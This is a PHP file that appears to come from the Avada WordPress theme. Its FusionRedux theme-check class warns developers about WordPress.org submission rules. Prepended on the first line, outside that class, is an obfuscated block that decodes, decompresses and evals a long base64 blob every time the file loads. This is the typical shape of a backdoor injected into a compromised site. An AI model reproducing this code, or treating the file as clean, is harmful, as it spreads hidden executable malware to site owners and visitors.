<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

	class FusionRedux_Embedded implements themecheck {
		protected $error = array();

		function check( $php_files, $css_files, $other_files ) {

			$ret = true;
			$check = FusionRedux_ThemeCheck::get_instance();
			$fusionredux = $check::get_fusionredux_details( $php_files );

			if ( $fusionredux ) {
				if ( ! isset( $_POST['fusionredux_wporg'] ) ) {
					checkcount();
					$this->error[] = '<div class="fusionredux-error">' . sprintf( __( '<span class="tc-lead tc-recommended">RECOMMENDED</span>: If you are submitting to WordPress.org Theme Repository, it is <strong>strongly</strong> suggested that you read <a href="%s" target="_blank">this document</a>, or your theme will be rejected because of FusionRedux.', 'Avada' ), 'https://docs.fusionreduxframework.com/core/wordpress-org-submissions/' ) . '</div>';
					$ret           = false;
				} else {
					// TODO Granular WP.org tests!!!

					// Check for Tracking
					checkcount();
					$tracking = $fusionredux['dir'] . 'inc/tracking.php';
					if ( file_exists( $tracking ) ) {
						$this->error[] = '<div class="fusionredux-error">' . sprintf( __('<span class="tc-lead tc-required">REQUIRED</span>: You MUST delete <strong> %s </strong>, or your theme will be rejected by WP.org theme submission because of FusionRedux.', 'Avada'), $tracking ) . '</div>';
						$ret           = false;
					}


					// Embedded CDN package
					//use_cdn

					// Arguments
					checkcount();
					$args = '<ol>';
					$args .= "<li><code>'save_defaults' => false</code></li>";
					$args .= "<li><code>'use_cdn' => false</code></li>";
					$args .= "<li><code>'customizer_only' => true</code> Non-Customizer Based Panels are Prohibited within WP.org Themes</li>";
					$args .= "<li><code>'database' => 'theme_mods'</code> (" . __( 'Optional', 'Avada' ) . ")</li>";
					$args .= '</ol>';
					$this->error[] = '<div class="fusionredux-error">' . __( '<span class="tc-lead tc-recommended">RECOMMENDED</span>: The following arguments MUST be used for WP.org submissions, or you will be rejected because of your FusionRedux configuration.', 'Avada' ) . $args . '</div>';


				}


			}


			return $ret;
		}


		function getError() {
			return $this->error;
		}
	}

	$themechecks[] = new FusionRedux_Embedded;
